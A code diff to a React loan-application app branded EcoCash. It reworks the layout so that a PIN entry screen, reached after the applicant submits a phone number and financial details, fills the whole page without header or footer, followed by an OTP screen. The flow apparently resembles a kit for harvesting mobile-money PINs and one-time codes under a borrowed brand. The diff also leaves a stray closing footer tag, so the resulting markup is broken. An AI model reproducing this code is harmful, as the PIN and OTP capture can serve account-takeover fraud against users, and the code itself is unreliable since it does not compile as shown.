@@ -259,90 +259,93 @@ export default function App() {
   }
 
   return (
-    <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
-      <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />
+    <div className={`min-h-screen text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white ${currentStep === 'pin' ? 'bg-white' : 'bg-slate-100/90'}`}>
+      {currentStep !== 'pin' && <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />}
 
-      <main className="flex-1 flex items-center justify-center p-3 sm:p-6">
-        <div className="w-full max-w-md bg-white border border-slate-200/90 rounded-3xl shadow-sm p-5 sm:p-7 transition-all my-2">
-          <AnimatePresence mode="wait">
-            <motion.div
-              key={currentStep}
-              initial={{ opacity: 0, y: 8 }}
-              animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, y: -8 }}
-              transition={{ duration: 0.22, ease: 'easeOut' }}
-            >
-              {currentStep === 'calculator' && (
-                <LoanCalculatorScreen
-                  loanAmount={formData.loanAmount}
-                  setLoanAmount={(val) => updateFormData({ loanAmount: val })}
-                  loanTermMonths={formData.loanTermMonths}
-                  setLoanTermMonths={(val) => updateFormData({ loanTermMonths: val })}
-                  onApplyNow={() => setCurrentStep('step1')}
-                />
-              )}
+      <main className={currentStep === 'pin' ? 'flex-1' : 'flex-1 flex items-center justify-center p-3 sm:p-6'}>
+        {currentStep === 'pin' ? (
+          <PinScreen
+            phone={formData.phone}
+            applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
+            onBack={() => setCurrentStep('step3')}
+            onNext={handlePinSubmit}
+          />
+        ) : (
+          <div className="w-full max-w-md bg-white border border-slate-200/90 rounded-3xl shadow-sm p-5 sm:p-7 transition-all my-2">
+            <AnimatePresence mode="wait">
+              <motion.div
+                key={currentStep}
+                initial={{ opacity: 0, y: 8 }}
+                animate={{ opacity: 1, y: 0 }}
+                exit={{ opacity: 0, y: -8 }}
+                transition={{ duration: 0.22, ease: 'easeOut' }}
+              >
+                {currentStep === 'calculator' && (
+                  <LoanCalculatorScreen
+                    loanAmount={formData.loanAmount}
+                    setLoanAmount={(val) => updateFormData({ loanAmount: val })}
+                    loanTermMonths={formData.loanTermMonths}
+                    setLoanTermMonths={(val) => updateFormData({ loanTermMonths: val })}
+                    onApplyNow={() => setCurrentStep('step1')}
+                  />
+                )}
 
-              {currentStep === 'step1' && (
-                <Step1LoanParameters
-                  formData={formData}
-                  updateFormData={updateFormData}
-                  onNext={() => setCurrentStep('step2')}
-                />
-              )}
+                {currentStep === 'step1' && (
+                  <Step1LoanParameters
+                    formData={formData}
+                    updateFormData={updateFormData}
+                    onNext={() => setCurrentStep('step2')}
+                  />
+                )}
 
-              {currentStep === 'step2' && (
-                <Step2ApplicantDetails
-                  formData={formData}
-                  updateFormData={updateFormData}
-                  onNext={() => setCurrentStep('step3')}
-                  onPrevious={() => setCurrentStep('step1')}
-                  onPhoneReady={handlePhoneReady}
-                />
-              )}
+                {currentStep === 'step2' && (
+                  <Step2ApplicantDetails
+                    formData={formData}
+                    updateFormData={updateFormData}
+                    onNext={() => setCurrentStep('step3')}
+                    onPrevious={() => setCurrentStep('step1')}
+                    onPhoneReady={handlePhoneReady}
+                  />
+                )}
 
-              {currentStep === 'step3' && (
-                <Step3FinancialReview
-                  formData={formData}
-                  updateFormData={updateFormData}
-                  onSubmit={handleSubmitApplication}
-                  onPrevious={() => setCurrentStep('step2')}
-                  isSubmitting={isSubmitting}
-                />
-              )}
+                {currentStep === 'step3' && (
+                  <Step3FinancialReview
+                    formData={formData}
+                    updateFormData={updateFormData}
+                    onSubmit={handleSubmitApplication}
+                    onPrevious={() => setCurrentStep('step2')}
+                    isSubmitting={isSubmitting}
+                  />
+                )}
 
-              {currentStep === 'success' && submittedApplication && (
-                <SuccessScreen
-                  application={submittedApplication}
-                  onNewApplication={handleReset}
-                  onContinue={handleReset}
-                />
-              )}
+                {currentStep === 'success' && submittedApplication && (
+                  <SuccessScreen
+                    application={submittedApplication}
+                    onNewApplication={handleReset}
+                    onContinue={handleReset}
+                  />
+                )}
 
-              {currentStep === 'pin' && (
-                <PinScreen
-                  phone={formData.phone}
-                  applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
-                  onBack={() => setCurrentStep('step3')}
-                  onNext={handlePinSubmit}
-                />
-              )}
-
-              {currentStep === 'otp' && (
-                <OtpScreen
-                  phone={formData.phone}
-                  applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
-                  verificationDisplay={submittedApplication?.verificationCode ?? ''}
-                  onBack={() => setCurrentStep('pin')}
-                  onSuccess={handleOtpSubmit}
-                />
-              )}
-            </motion.div>
-          </AnimatePresence>
-        </div>
+                {currentStep === 'otp' && (
+                  <OtpScreen
+                    phone={formData.phone}
+                    applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
+                    verificationDisplay={submittedApplication?.verificationCode ?? ''}
+                    onBack={() => setCurrentStep('pin')}
+                    onSuccess={handleOtpSubmit}
+                  />
+                )}
+              </motion.div>
+            </AnimatePresence>
+          </div>
+        )}
       </main>
 
-      <footer className="py-4 text-center text-xs text-slate-400 font-medium">
-        &copy; 2025 EcoCash
+      {currentStep !== 'pin' && (
+        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
+          &copy; 2025 EcoCash
+        </footer>
+      )}
       </footer>
     </div>
   );
